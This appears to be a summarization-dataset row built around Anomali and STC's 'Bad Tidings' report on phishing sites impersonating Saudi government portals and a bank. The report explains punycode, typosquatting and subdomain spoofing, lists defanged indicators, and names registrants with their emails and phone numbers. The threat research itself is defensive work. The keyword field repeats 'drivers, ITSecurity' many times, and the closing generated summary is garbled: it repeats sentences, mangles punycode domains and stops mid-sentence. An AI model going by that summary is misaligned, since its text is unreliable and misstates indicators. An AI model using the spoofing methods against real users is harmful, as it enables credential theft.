drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers, ITSecurity drivers;en;{'r': 0.013863773357444244, 'p': 0.575, 'f': 0.027074749393075113};{'r': 0.0012106537530266344, 'p': 0.07272727272727272, 'f': 0.0023816608865767966};{'r': 0.013261000602772756, 'p': 0.55, 'f': 0.025897586355994477}
https://www.anomali.com/blog/bad-tidings-phishing-campaign-impersonates-saudi-government-agencies-and-a-saudi-financial-institution;“Bad Tidings” Phishing Campaign Impersonates Saudi Government Agencies and a Saudi Financial Institution;"Executive SummaryIn January 2019, researchers from Anomali Labs and Saudi Telecom Company (STC) observed a spike in phishing websites impersonating the Saudi Arabian Ministry of Interior's e-Service portal known as ""Absher"". Further analysis uncovered a broader phishing campaign targeting four different Kingdom of Saudi Arabia government agencies and a single Saudi-based financial institution. The campaign dates back to least late-November 2016 in which over 90 confirmed phishing hostnames (46 unique domains) were created to target at least five KSA entities. Given the attackers targeting affinity for the Saudi Ministry of Interior's Absher portal, which represents close to 60 percent of the KSA-related phishing sites, we have named the campaign ""Bad Tidings"" after the English language translation ""Good Tidings"" of the Arabic language word ""Absher"".Prior to release of this blog post, Anomali and STC have been coordinated with the National Cybersecurity Authority (NCA) and Saudi CERT to address this security concern. We also submitted the phishing sites to Google Safe Browsing and Microsoft Defender Security Intelligence as an additional security measure to block the fraudulent websites.Bad Tidings Campaign OverviewThe Bad Tidings Campaign is an ongoing phishing campaign that began on or about November 21, 2016 and known for targeting four Kingdom of Saudi Arabia government agencies with a single occurrence against a Saudi-based financial institution. Since late-November 2016, our researchers have observed 95 unique phishing hostnames created either using misspelled, alternative top level domains (TLDs) other than the legitimate gov.sa domains, or punycode-based sites. To date, the attacker(s) have targeted the following KSA entities:First Seen Last Seen KSA Entity Number of Observed Phishing Sites 12/17/2017 3/16/2019 Ministry of Interior (Absher) 54 (56.84%) 8/16/2017 3/17/2019 Saudi Government 18 (18.95%) 1/4/2018 3/18/2019 Ministry of Foreign Affairs 14 (14.74%) 8/16/2017 3/16/2019 Ministry of Labor and Social Development 7 (7.37%) 2/17/2019 2/19/2019 Saudi British Bank 2 (2.11%)Characteristics of Bad Tidings Phishing SitesThe phishing hostnames created during this campaign employ multiple spoofing techniques to disguise the fraudulent sites. We have observed the attackers create sites using either a single or combined technique of punycode-based spoofing attacks, typosquatting, or SubDomain spoofing attacks. A detailed explanation of these spoofing techniques and their use during the Bad Tidings Campaign can be found below in the ""Spoofing Techniques Employed"" section. During the campaign, the attackers registered KSA-related fraudulent domains using one of 14 different top level domains (TLDS) with the top five represented by .cc with 30 (31.58%) domains followed by .xyz (17.89%), .club with 12 (12.63%), .site with seven (7.37%), and .services with five (5.26%).The phishing sites associated with this campaign typically contain two web pages, a replica of the target entities' homepage and a faux login page. Upon first look, the fraudulent login pages appear to display the legitimate account access portal but when users provide their userid and password, they are redirected to the initial phishing landing page without logging into the intended resource. Typically, at this stage the phishers have stolen the user's credentials and are likely to sell them on underground markets or use them to impersonate the victim to commit fraudulent actions.Response from the Saudi Twitter CommunityThe earliest known open source reference of phishing domains associated with the Bad Tidings Campaign appeared on Twitter in a message by the user @urlscan.io at 1:33 PM EST on Wednesday, January 9, 2019. Following this tweet, we have seen at least three other Twitter users post 15 original messages with the most prolific coming from @SaudiDFIR. In one of @SaudiDFIR's most recent tweets at 9:41 A.M. EST on Monday, March 18, 2019, they described the attackers switching to Registrar NameCheap, which is a new domain registration vendor outside of the typical use of GoDaddy. It is still unclear if this is a change of preferred vendors or an additional Registar used for registering fraudulent domains, however, our researchers continue to monitor the campaign to validate a shift or addition in tactics. A breakdown of Bad Tidings Campaign related tweets can be found in Appendix B - Summary of Tweets Related to the Bad Tidings Campaign.Figure 1. Faux websites spoofing the Ministry of Labor (Top Left), Ministry of Foreign Affairs (Bottom Left), Ministry of Interior (Middle), Saudi National Portal (Top Right), & Saudi British Bank (Bottom Right)Spoofing Techniques EmployedPunycode SpoofingPunycode is a method to represent International Domain Names (IDNs) in local language characters which are normally limited by letters (A-Z, a-z), digits (0-9), and hyphens (-) to be supported by the domain name system (DNS). For instance, ""??????? ??????? ????????"" (English Translation: Kingdom of Saudi Arabia) would be encoded as ""btdbbeedc3dr2a6eg3lpaaegha5fvb"" and inserted with the prefix ""xn--"" resulting in ""xn-- -btdbbeedc3dr2a6eg3lpaaegha5fvbi"". In a punycode spoofing attack scenario, the malicious actor registers a domain name using a native format (unicode) that has a punycode form similar to a legitimate domain name. For example, the Ministry of Foreign Affairs parent hostname mofa.gov.sa could be spelled out as ?ofa[.]??v[.]sa (unicode) and converted into xn--of-kia5154a[.]xn--v-r1a54l[.]xn--s-0fa (punycode).The first use of the punycode spoofing technique was on May 24, 2018 and continued over a six month period with the last known one created on December 6, 2018. During this period, the threat actor or group registered a total of 13 unique punycode domains to target three KSA government agencies: KSA Government, MOI, and MOFA. This technique was further combined with a subdomain spoofing attack to create 44 variations impersonating the parent domain of the targeted agencies e.g. moi[.]gov[.]sa[.]xn--mgb[.]cc. The below table represents the 13 unique punycode domains observed in mid to late 2018.Creation Date Punycode Domain IDN Domain Spoofed KSA Ministries 12/6/2018 xn--s-0fa[.]site sa[.]site KSA Government, MOI 11/21/2018 xn--s-wha[.]cc s?[.]cc KSA Government, MOFA, MOI 10/9/2018 xn--s-ufa[.]site sa[.]site KSA Government, MOFA, MOI 10/9/2018 xn--s-ufa[.]ws sa[.]ws KSA Government, MOI 10/9/2018 xn--s-ufa[.]xyz sa[.]xyz KSA Government, MOFA, MOI 9/17/2018 xn--s-0fa[.]cc sa[.]cc KSA Government, MOFA, MOI 9/16/2018 xn--a-hrm[.]cc ?a[.]cc KSA Government 8/3/2018 xn----ymcbgcb3bmeyo2w[.]cc ??????-?????[.]cc MOFA 8/1/2018 xn------nzeaabbbafni4f0aeuf8b7a0b6q5aejenl1f[.]xyz ?????????-??????-?????-??????[.]xyz MOI 7/31/2018 xn--s-oha[.]cc s?[.]cc KSA Government, MOFA, MOI 7/30/2018 xn--s-ufa[.]cc sa[.]cc KSA Government, MOFA 7/7/2018 xn--a-0ma[.]cc ?a[.]cc KSA Government, MOFA, MOI 5/24/2018 xn--mgb[.]cc ?[.]cc MOI, MOFASubDomain SpoofingIn the 2018 APWG's Symposium on Electronic Crime Research, two researchers from the Nile University stated that a subdomain spoofing attack, ""takes advantage of the fact that the subdomain is displayed in the least significant label order"". An attacker might attempt to confuse the user by registering a third level domain name that seems similar to the authentic domain name, then by crafting a long URL string that contains the fake domain name, a user may be lured into thinking that he or she is accessing the legitimate domain name. For example, the Bad Tidings actor or group registered multiple punycode domains to target KSA government agencies such as the Ministry of Foreign Affairs (MOFA)'s electronic visa services platform (visa.mofa.gov) using the fraudulent site visa[.]mofa[.]gov[.]xn--s-ufa[.]xyz, which closely resembles the authentic MOFA site.TyposquattingTyposquatting is the practice of registering domains that can be confused for the legitimate site or brand name by using spelling or grammatical errors or even the wrong top level domain (TLD). For example, the Absher portal is a web page located underneath the website https://www.moi.gov.sa/, however, malicious actors have appropriated the brand name ""Absher"" to create typosquatting domains with misspellings and wrong TLDs e.g. abshr[.]xyz or simply wrong TLDs e.g. absher[.]space.Threat Infrastructure AnalysisWhois Record AnalysisUpon initial review of Whois record information for the 46 unique domains used in the Bad Tidings Campaign, the threat actor or group provided minimal registrant information. Nonetheless, there were multiple references to Yemen, two Yemeni districts: Al Hada and Sanaa, and two distinct registrant organizations, mdr and WVW. A historical Whois record search for the Yemeni registrants revealed:Yemeni Registrant 1 - The registrant named ""Anwr Abdu"" of registrant organization ""WVW"" used a free Gmail account (wwvvxx2013{at}gmail[.]com) to register at least four fraudulent domains: moi[.]services, xn--s-ufa[.]site, xn--s-ufa[.]xyz, and ar-saudi[.]xyz. All of the domains were created with Registrar GoDaddy between August 16, 2017 to October 9, 2018. This registrant is listed in Whois records with an undisclosed address in Sanaa, Yemen 00967 with a contact phone number of +967.7102552. This actor is known to created multiple phishing sites to target four KSA government agencies: MOI (Absher), MOFA, Saudi Government, and MLSD.- The registrant named ""Anwr Abdu"" of registrant organization ""WVW"" used a free Gmail account (wwvvxx2013{at}gmail[.]com) to register at least four fraudulent domains: moi[.]services, xn--s-ufa[.]site, xn--s-ufa[.]xyz, and ar-saudi[.]xyz. All of the domains were created with Registrar GoDaddy between August 16, 2017 to October 9, 2018. This registrant is listed in Whois records with an undisclosed address in Sanaa, Yemen 00967 with a contact phone number of +967.7102552. This actor is known to created multiple phishing sites to target four KSA government agencies: MOI (Absher), MOFA, Saudi Government, and MLSD. Yemeni Registrant 2 - The registrant named ""Hgvhud Ali"" used a free Gmail account (hgvhud{at}gmail[.]com) to register a single typosquatting domain (sa-r[.]xyz) with Registrar GoDaddy on January 4, 2018. This registrant is listed in Whois records with an undisclosed address in Sanaa, Yemen 00967 with a contact phone number of +967.701913759. As recent as July 1, 2018, we have observed at least one subdomain spoofing attack against the MOFA electronic visa portal using fraudulent hostname visa[.]mofa[.]gov[.]sa-r[.]xyz.- The registrant named ""Hgvhud Ali"" used a free Gmail account (hgvhud{at}gmail[.]com) to register a single typosquatting domain (sa-r[.]xyz) with Registrar GoDaddy on January 4, 2018. This registrant is listed in Whois records with an undisclosed address in Sanaa, Yemen 00967 with a contact phone number of +967.701913759. As recent as July 1, 2018, we have observed at least one subdomain spoofing attack against the MOFA electronic visa portal using fraudulent hostname visa[.]mofa[.]gov[.]sa-r[.]xyz. Yemeni Registrant 3 - The registrant named ""Mohammed Alhamad"" used a free Hotmail account (mohmoh912{at}hotmail[.]com) to register a single Saudi Government national portal-themed typosquatting domain (ksa[.]services) with Registrar GoDaddy on November 19, 2016. This registrant is listed in Whois records with a potentially faux address of Al Dereiah, Riyadh, Sanaa, 11428, YE with a contact phone number of +966.505900772. We judge with moderate confidence that the threat actor or group is likely to have employed poor operational security (OPSEC) in disguising their country of origin of Yemen versus Saudi Arabia.Other suspect registrant information, we uncovered that targeted KSA-related entities to a lesser degree and non-Yemen based were:On March 17, 2019, an unknown registrant from Panama registered the MLSD-themed typosquatting domain mlsd[.]icu with Registrar GoDaddy. Within the same day, the malicious actor created two subdomains, moi[.]gov[.]sa[.]mlsd[.]icu and www[.]moi[.]gov[.]sa[.]mlsd[.]icu, which is a spoofed hostname targeting the Ministry of Interior's Absher portal.On March 13, 2019, an unknown registrant from Saudi Arabia registered a seemingly innocuous domain isdar[.]club with Registrar GoDaddy. Within two days, the malicious actor created a subdomain, visa[.]mofa[.]gov[.]sa[.]isdar[.]club, to target the Ministry of Foreign Affairs (MOFA)'s electronic visa service portal.On February 16, 2019, a registrant named ""Adam Booth"" used an email (adam{at}omnia[.]ae) from a company named ""Omnia"", a leading digital and branding agency in Dubai (UAE) and Abu Dhabi (UAE), to register the Absher-themed typosquatting domain absher[.]world with Registrar GoDaddy. This registrant is listed in Whois records with a physical address of G26, Building 9, Dubai Media City, Dubai, UAE 500475.On December 13, 2018, a registrant using the name ""Tlgnyx9621-30252"" created the typosquatting domain mlsd[.]se with German Registrar 1API GmbH. Within three days of registration, the threat actor purchased a domain validated SSL/TLS certificate (SN: 193433912382113003336707843308288517108) from Comodo CA and created two fraudulent subdomains nitaqat[.]gov[.]mlsd[.]se and www[.]nitaqat[.]gov[.]mlsd[.]se to target the Ministry of Labor and Social Development (MLSD).On March 30, 2018, a registrant and known cybersquatter named ""Yang Xiaoyuan"" alias ""Yang Xiao Yuan"" with no listed registrant email address registered the typosquatting domain (sa-ar[.]xyz) with Registrar Alibaba. This registrant is listed in Whois records with a physical address of Hai Yang Ming Zhu 4 Dong 2 Dan Yuan, Shao Yang Shi, Hu Nan, China 42200 and contact number of 86.17363984. According to historical Whois records, this domain was previously owned by Yemeni registrant named ""Hgvhud Ali"", registered with Registrar GoDaddy, and expired on March 13, 2018 in which time ""Yang Xiaoyuan"" registered and parked the domain with Registrar Alibaba on March 30, 2018. During this period, we observed two separate subdomain spoofing attacks moi[.]gov[.]i[.]sa-ar[.]xyz and moi[.]gov[.]e[.]sa-ar[.]xyz in December 2017 targeting the MOI's Absher portal.IP Address AnalysisThe campaign used three primary IP addresses to host faux login pages mimicking KSA entities, all of which were assigned to GoDaddy (AS2649) address space.The main IP address used in the Bad Tidings campaign was 160[.]153[.]75[.]64. The first phishing site observed resolving to this address was on December 17, 2017 with the latest on March 6, 2019. A passive DNS search of this address uncovered 388 total hostnames dating back to September 3, 2012. Our analysis found that 76 phishing sites out 388 hostnames or 19.58% were used to target the Ministry of Interior (Absher), Saudi Government, Ministry of Foreign Affairs, Ministry of Labor and Social Development, and Saudi British Bank.The second IP address observed was 23[.]229[.]166[.]161. The earliest phishing site was seen on August 16, 2017 and the most recent on March 18, 2019. A passive DNS search revealed 463 historical hostname resolutions dating back to May 26, 2014. We found 10 unique hostnames hosted on four different domains were used to target four KSA government agencies: the Ministry of Interior (Absher), Saudi Government, the Ministry of Foreign Affairs, and the Ministry of Labor and Social Development.The third IP address observed is 160[.]153[.]246[.]182. The earliest phishing site was seen on August 2, 2018 and the most recent on March 18, 2019. A passive DNS search uncovered 13 historical hostname resolutions dating back to June 7, 2012. Of these 13 hostnames, there were eight hosted on six unique domains were used to target four KSA government agencies: the Ministry of Interior (Absher), Saudi Government, the Ministry of Foreign Affairs, and the Ministry of Labor and Social Development.Figure 2. Historical domain resolutions for the IP address 160[.]153[.]75[.]64SSL Certificate AnalysisOur research found that 42 out of 95 or 44.21% of the phishing sites used one of 24 unique SSL/TLS certificate issued by a single vendor, Comodo CA (Sectigo). The attackers seem to prefer the purchase and installation of Domain Validated (DV) certificates. For example, the first observed DV SSL/TLS certificate (SN: 64391503747305407148025706187116826556) was installed on two phishing sites moi[.]gov[.]sa[.]xn--mgb[.]cc and www[.]moi[.]gov[.]sa[.]xn--mgb[.]cc and used to impersonate the MOI's e-Service portal (Absher). We believe this is most likely due to the issuing of DV certificates through automated systems and the limited vetting requirements to obtain these certificates such as proving ownership with an email from the created domain or phone call from a number contained in the Whois record of the domain.Figure 3. First Bad Tidings Campaign SSL/TLS certificate observed (Source: Censys.io)A Peek Inside an Absher Phishing SiteAs previously mentioned, the Ministry of Interior's e-Services portal known as Absher was the most targeted KSA government agency. Absher is an electric system that provides a total of 160 services such as checking mail, registering vehicles, booking government appointments, and applying for visas. The phishing websites mimic the MOI home page and Absher login portal in an attempt to steal the Saudi citizen's email address and password. The schemes have been designed to trick Saudi citizens trying to access their online Absher account and, upon first look, appears to display the legitimate login portal. One of the most recent examples, on March 4, 2019, the threat actor or group employed the typosquatting and subdomain spoofing attack techniques to target the MOI with a phishing website <hxxp://www[.]moi[.]gov[.]sa[.]abshr[.]club>. At the time of discovery, the website was hosted by a GoDaddy server resolving to IP address 160[.]153[.]75[.]64 (AS26496) and located in the United States. The site contained two cloned versions of legitimate MOI websites - the MOI homepage and MOI e-Services Portal (Absher) - used to target unsuspecting Saudi citizens (See Figure 4). The phishing site's address is convincingly similar looking to the MOI website hosted at moi.gov.sa. Whether users attempt to register for an Absher account, reset their password, or login into their account, they are presented with the same pop-up window that requests their username (email address) and password (See Figure 5). To make the faux login page appear even more authentic, users have to complete a Captcha, which is a common challenge-response system designed to differentiate humans from robots or automated software tools that site owners use to prevent brute-force attacks. Once the user has entered their account credentials, they are redirected back to the fraudulent MOI homepage.Figure 4. Faux Ministry of Interior of the Kingdom of Saudi Arabia home pageFigure 5. Faux account login page for MOI e-Services Absher portalProtecting the Kingdom of Saudi Arabia Government Agencies from Domain ImpersonationsTrademark Registration - Protecting your brand and its reputation involves registering your trademark. As a trademark owner, you have the right to submit takedowns of fraudulent domains and websites on your own or through trusted vendors. This is usually done by filing a complaint with the offending organizations via Registrars and Hosting Providers. If this request is not honored, the trademark owner has an alternative takedown means using the Uniform Domain-Name Dispute Resolution-Policy (UDRP) by filing a Uniform Rapid Suspension (URS) complaint with the World Intellectual Property Organisation (WIPO) to takedown the offending domains. A friendly reminder though, organizations need to first register your trademarked brand with the Trademark Clearinghouse (TMCH), which is ICANN's database of protected trademarks before submitting the URS complaint.- Protecting your brand and its reputation involves registering your trademark. As a trademark owner, you have the right to submit takedowns of fraudulent domains and websites on your own or through trusted vendors. This is usually done by filing a complaint with the offending organizations via Registrars and Hosting Providers. If this request is not honored, the trademark owner has an alternative takedown means using the Uniform Domain-Name Dispute Resolution-Policy (UDRP) by filing a Uniform Rapid Suspension (URS) complaint with the World Intellectual Property Organisation (WIPO) to takedown the offending domains. A friendly reminder though, organizations need to first register your trademarked brand with the Trademark Clearinghouse (TMCH), which is ICANN's database of protected trademarks before submitting the URS complaint. Defensive Registration - If cost effective, proactively register name variants of your domains with particular emphasis for websites offering informational or account services for Saudi citizens and other individuals. Once purchased, we recommend ensuring each domain is configured to redirect to the legitimate website as this could help with users who unknowingly mistype the website address, thereby, driving traffic to the intended source.- If cost effective, proactively register name variants of your domains with particular emphasis for websites offering informational or account services for Saudi citizens and other individuals. Once purchased, we recommend ensuring each domain is configured to redirect to the legitimate website as this could help with users who unknowingly mistype the website address, thereby, driving traffic to the intended source. Domain Monitoring and Takedown Service - Consider investing in a commercial domain monitoring and takedown service that provides early detection, alerting, and removal of fraudulent domains and websites. The service should be capable of monitoring domains and subdomains as observed in the latest phishing campaign, the threat actor or group uses a variety of spoofing techniques to achieve their objectives.- Consider investing in a commercial domain monitoring and takedown service that provides early detection, alerting, and removal of fraudulent domains and websites. The service should be capable of monitoring domains and subdomains as observed in the latest phishing campaign, the threat actor or group uses a variety of spoofing techniques to achieve their objectives. Multi-Factor Authentication (MFA) - Implement a multi-factor authentication (MFA) protocol for accessing online government services. Online account access using traditional methods such as email addresses and passwords can be susceptible to brute-force attacks or social engineering attacks. Supplementing account access by adding an extra authentication step like MFA can offer a stronger security measure to combat unauthorized entry to your user's accounts. This can prevent malicious actors from simply guessing a user's account credentials or setting up a faux login page and luring your users to disclose their credentials, thereby, taking over their account and accessing their privileged data.- Implement a multi-factor authentication (MFA) protocol for accessing online government services. Online account access using traditional methods such as email addresses and passwords can be susceptible to brute-force attacks or social engineering attacks. Supplementing account access by adding an extra authentication step like MFA can offer a stronger security measure to combat unauthorized entry to your user's accounts. This can prevent malicious actors from simply guessing a user's account credentials or setting up a faux login page and luring your users to disclose their credentials, thereby, taking over their account and accessing their privileged data. Public Service Announcements - Upon notification or becoming aware of a phishing or scam incident, issue a public statement to inform Saudi citizens about the situation, how to spot the fraudulent campaign, steps on how to protect themselves from being victimized, and measures to take if they have been or believe to have been duped in the fraudulent incident.Defending against MOI e-Services Portal (Absher) Phishing ScamsStay Alert of the Latest Phishing Campaigns - Be wary of unsolicited emails or SMS (text) messages from untrusted users and refrain from opening any file attachments or clicking on any embedded hyperlinks especially when the sender requests for you to visit a suspicious-looking site requesting you to provide sensitive and confidential information such as email address, password, valid identification or residence permit (Iqama) number, and mobile number.- Be wary of unsolicited emails or SMS (text) messages from untrusted users and refrain from opening any file attachments or clicking on any embedded hyperlinks especially when the sender requests for you to visit a suspicious-looking site requesting you to provide sensitive and confidential information such as email address, password, valid identification or residence permit (Iqama) number, and mobile number. Report Attacks to the Appropriate Authorities - If a Saudi Arabian citizen or other individual encounters a fraudulent or malicious website impersonating the MOI e-Services Portal (Absher) or other online government services, do not attempt to log into the website. Instead report it directly to your local security contact and the National Cyber Security Center (info@ncsc.gov.sa) and Saudi CERT (info@cert.gov.sa). We also recommend submitting the fraudulent site(s) to Google Safe Browsing and Microsoft Defender Security Intelligence to help prevent other Internet-wide users from being duped.- If a Saudi Arabian citizen or other individual encounters a fraudulent or malicious website impersonating the MOI e-Services Portal (Absher) or other online government services, do not attempt to log into the website. Instead report it directly to your local security contact and the National Cyber Security Center (info@ncsc.gov.sa) and Saudi CERT (info@cert.gov.sa). We also recommend submitting the fraudulent site(s) to Google Safe Browsing and Microsoft Defender Security Intelligence to help prevent other Internet-wide users from being duped. Website Address Bar Inspection - Always inspect the website address to ensure the legitimate website is properly displayed. Do not blindly trust that the padlock located at the top left of the address bar signifies that the website is legitimate as it only indicates the information moved from your computer to the requested site is encrypted.- Always inspect the website address to ensure the legitimate website is properly displayed. Do not blindly trust that the padlock located at the top left of the address bar signifies that the website is legitimate as it only indicates the information moved from your computer to the requested site is encrypted. Password Management: Passphrases Versus Passwords - Use long passphrases instead of passwords. Passphrases are ""memorized secrets"" consisting of a sequence of words or other text used to authenticate your identity e.g. bestcolorintheworldisgreen (Weak passphrase) and b3$tc0l0RiNth3w0rLd1sgr33n (Strong passphrase). Remember when creating a passphrase to use a unique one per account and ensure it is more than 12 characters in length with a mixture of numbers, upper and lower case letters, and symbols. Password Manager - Consider investing in a password manager application from a reputable vendor to store and manage your passwords securely on your computer, mobile device, or in the cloud. As a reminder, make sure that your passphrase for your password manager also uses the same fundamentals mentioned above. Two-Factor/Multi-Factor Authentication - Where available, turn on the two-factor authentication or multi-factor authentication (MFA) at the online account's security settings and follow the provided instructions. Enabling 2FA/MFA offers an added layer of security because if your email address and password have been previously compromised, a lost or stolen password alone would not be sufficient to gain access to your account and sensitive data.ConclusionAnomali and STC believe the Bad Tidings campaign's heavy focus on the Kingdom of Saudi Arabia (KSA)'s government agencies electronic services is reflective of information gathering operations employed by a financially-motivated actor or group attempting to steal and monetize personally identifiable information (PII) and other sensitive data. Online government portals offering citizen services remain attractive targets as they store vast amounts of personal and sensitive information in a centralized location and if compromised, can provide malicious actors with enough data for resale on underground markets or to commit fraudulent actions such as identity theft. We expect this campaign or similar ones will continue to target KSA government e-services using phishing attacks via email or text messages to lure KSA citizens to faux login portals. Therefore, we urge all KSA citizens to remain vigilant of these phishing threats and report any suspicious activity to the appropriate authorities.Anomali Labs and STC are actively monitoring phishing, malware, and other cyber threats to the Kingdom of Saudi Arabia to enhance the security of Kingdom and protect its citizens. We will continue to share intelligence with the community and affected organizations as they arise.ReferencesAppendix A - Indicators of CompromiseMOI e-Services Portal (Absher) Phishing Sitesabsher[.]ccabsher[.]clubabsher[.]esabsher[.]liveabsher[.]workabsher[.]worldabshr[.]clubabshr[.]xyzgov[.]moi[.]servicesmoi[.]gov[.]e[.]sa-ar[.]xyzmoi[.]gov[.]i[.]sa-ar[.]xyzmoi[.]gov[.]sa[.]absher[.]ccmoi[.]gov[.]sa[.]absher[.]clubmoi[.]gov[.]sa[.]absher[.]esmoi[.]gov[.]sa[.]absher[.]workmoi[.]gov[.]sa[.]absher[.]worldmoi[.]gov[.]sa[.]abshr[.]clubmoi[.]gov[.]sa[.]abshr[.]xyzmoi[.]gov[.]sa[.]mlsd[.]icumoi[.]gov[.]sa[.]xn--mgb[.]ccmoi[.]gov[.]xn--a-0ma[.]ccmoi[.]gov[.]xn--s-0fa[.]ccmoi[.]gov[.]xn--s-0fa[.]sitemoi[.]gov[.]xn--s-oha[.]ccmoi[.]gov[.]xn--s-ufa[.]sitemoi[.]gov[.]xn--s-ufa[.]wsmoi[.]gov[.]xn--s-ufa[.]xyzmoi[.]gov[.]xn--s-wha[.]ccmoi[.]servicesvisa[.]mofa[.]gov[.]sa[.]absher[.]clubvisa[.]mofa[.]gov[.]sa[.]absher[.]workwww[.]absher[.]ccwww[.]absher[.]clubwww[.]google[.]com[.]sa-ar[.]xyzwww[.]gov[.]moi[.]serviceswww[.]moi[.]gov[.]sa[.]absher[.]ccwww[.]moi[.]gov[.]sa[.]absher[.]clubwww[.]moi[.]gov[.]sa[.]absher[.]eswww[.]moi[.]gov[.]sa[.]absher[.]spacewww[.]moi[.]gov[.]sa[.]absher[.]workwww[.]moi[.]gov[.]sa[.]absher[.]worldwww[.]moi[.]gov[.]sa[.]abshr[.]clubwww[.]moi[.]gov[.]sa[.]mlsd[.]icuwww[.]moi[.]gov[.]sa[.]xn--mgb[.]ccwww[.]moi[.]gov[.]xn--s-0fa[.]ccwww[.]moi[.]gov[.]xn--s-0fa[.]sitewww[.]moi[.]gov[.]xn--s-oha[.]ccwww[.]moi[.]gov[.]xn--s-ufa[.]sitewww[.]moi[.]gov[.]xn--s-ufa[.]wswww[.]moi[.]gov[.]xn--s-ufa[.]xyzwww[.]moi[.]gov[.]xn--s-wha[.]ccxn------nzeaabbbafni4f0aeuf8b7a0b6q5aejenl1f[.]xyzxn--mgb[.]ccxn--s-ufa[.]xyzMinistry of Foreign Affairsengaz[.]clubenjazit[.]com[.]sa[.]xn--mgb[.]ccenjazit[.]com[.]xn--a-0ma[.]ccisdar[.]clubvisa[.]mofa[.]gov[.]sa-r[.]xyzvisa[.]mofa[.]gov[.]sa[.]engaz[.]clubvisa[.]mofa[.]gov[.]sa[.]isdar[.]clubvisa[.]mofa[.]gov[.]sa[.]xn--mgb[.]ccvisa[.]mofa[.]gov[.]xn--a-0ma[.]ccvisa[.]mofa[.]gov[.]xn--s-0fa[.]ccvisa[.]mofa[.]gov[.]xn--s-ufa[.]xyzvisa[.]mofa[.]gov[.]xn--s-wha[.]ccxn----ymcbgcb3bmeyo2w[.]cc??????-?????[.]ccSaudi Governmentar-saudi[.]xyzgoogle[.]com[.]ar-saudi[.]xyzksa[.]servicesmail[.]ar-saudi[.]xyzsa-ar[.]ccsa-r[.]xyzwww[.]sa-r[.]xyzwww[.]xn--s-0fa[.]ccwww[.]xn--s-ufa[.]sitexn--a-0ma[.]ccxn--a-hrm[.]ccxn--s-0fa[.]ccxn--s-0fa[.]sitexn--s-oha[.]ccxn--s-ufa[.]ccxn--s-ufa[.]sitexn--s-ufa[.]wsxn--s-wha[.]ccMinistry of Labor and Social Development (Nitaqat)mlsd[.]icumlsd[.]semlsd[.]servicesmlsd[.]spacemlsd[.]worldnitaqat[.]gov[.]mlsd[.]senitaqat[.]mlsd[.]gov[.]sa[.]ar-saudi[.]xyzSaudi British Bank (SABB)sabbank[.]netwww[.]sabbank[.]netIP Addresses Used During Bad Tidings Campaign160[.]153[.]75[.]6423[.]229[.]166[.]161160[.]153[.]246[.]182Comodo-Issued Domain Validated SSL/TLS Certificate Serial Numbers1016517070312956960634060904847230554111293370724817480742597991450047144848001376174698566119682919715807208313588241379589549534717786262123634185185216611586223657136000395739456022998582830841645743870835938908259528847942687086921910545754246536707421008072874783507521934339123821130033367078433082885171081943412141294853833727271409684973906122001622883137013031203580856088866681025373795414702417213064593971394457857026389809207867391096569290739559685567626462847045013454566828562355307693706727765484772788112301140883107088008939030121402163403896172580868262310346110531220100421824";"In response to the Bad Tidings Campaign, Anomali Labs and Saudi Telecom Company (STC) have been coordinating with the National Cybersecurity Authority (NCA) and Saudi CERT to address this security concern. We also submitted the phishing sites to Google Safe Browsing and Microsoft Defender Security Intelligence as an additional security measure to block the fraudulent websites. The Ministry of Foreign Affairs parent hostname mofa.gov.sa could be spelled out as ?ofa[.]??v[. ]sa (unicode) and converted into xnofkia5154a[.]xnvr1a54l[. ]xns0fa (punycode).The first use of the punycode spoofing technique was on May 24, 2018 and continued over a six month period with the last known one created on December 6, 2018. During this period, the threat actor or group registered a total of 13 unique punycode domains to target three KSA government agencies: KSA Government, MOI, and MOFA. This technique was further combined with a subdomain spoofing attack to create 44 variations impersonating the parent domain of the targeted agencies e.g. moi[.]gov[.]sa[.]xnmgb[.]cc. The Bad Tidings actor or group registered multiple punycode domains to target KSA government agencies such as the Ministry of Foreign Affairs (MOFA)'s electronic visa services platform (visa.mofa.gov) using the fraudulent site visa[.]mofa[.]gov[.]xnsufa[. ]xyz, which closely resembles the authentic MOFA site. Yemeni Registrant 1 The registrant named ""Anwr Abdu"" of registrant organization ""WVW"" used a free Gmail account (wwvvxx2013{at}gmail[. ]com) to register at least four fraudulent domains: moi[. ]services, xnsufa[. ]site, xnsufa[. ]xyz, and arsaudi[.]xyz. All of the domains were created with Registrar GoDaddy between August 16, 2017 to October 9, 2018. This registrant is listed in Whois records with an undisclosed address in Sanaa, Yemen 00967 with a contact phone number of +967.7102552. This actor is known to created multiple phishing sites to target four KSA government agencies: MOI (Absher), MOFA, Saudi Government, and MLSD. Yemeni Registrant 2 The registrant named ""Hgvhud Ali"" used a free Gmail account (hgvhud{at}gmail[. ]com) to register a single typosquatting domain (sar[. ]xyz) with Registrar GoDaddy on January 4, 2018. This registrant is listed in Whois records with an undisclosed address in Sanaa, Yemen 00967 with a contact phone number of +967.701913759. As recent as July 1, 2018, we have observed at least one subdomain spoofing attack against the MOFA electronic visa portal using fraudulent hostname visa[.]mofa[.]gov[.] The MOFA electronic visa portal has been targeted by at least one subdomain spoofing attack using fraudulent hostname visa[.]mofa[.]gov[.]sar[.]xyz. Yemeni Registrant 3 The registrant named ""Mohammed Alhamad"" used a free Hotmail account (mohmoh912{at}hotmail[. ]com) to register a single Saudi Government national portalthemed typosquatting domain (ksa[. ]services) with Registrar GoDaddy on November 19, 2016. This registrant is listed in Whois records with a potentially faux address of Al Dereiah, Riyadh, Sanaa, 11428, YE with a contact phone number of +966.505900772. We judge with moderate confidence that the threat actor or group is likely to have employed poor operational security (OPSEC) in disguising their country of origin of Yemen versus Saudi Arabia.Other suspect registrant information, we uncovered that targeted KSArelated entities to a lesser degree and nonYemen based were:On March 17, 2019, an unknown registrant from Panama registered the MLSDthemed typosquatting domain mlsd[. ]icu with Registrar GoDaddy. Within the same day, the malicious actor created two subdomains, moi[.]gov[.]sa[.]mlsd[. ]icu and www[.]moi[.]gov[.]sa[.]mlsd[. ]icu, which is a spoofed hostname targeting the Ministry of Interior's Absher portal.On March 13, 2 The Bad Tidings campaign targeted the Ministry of Interior's eServices portal known as Absher. The phishing websites mimic the MOI home page and Absher login portal in an attempt to steal the Saudi citizen's email address and password. The ITSecurity report states that phishing websites mimic the MOI 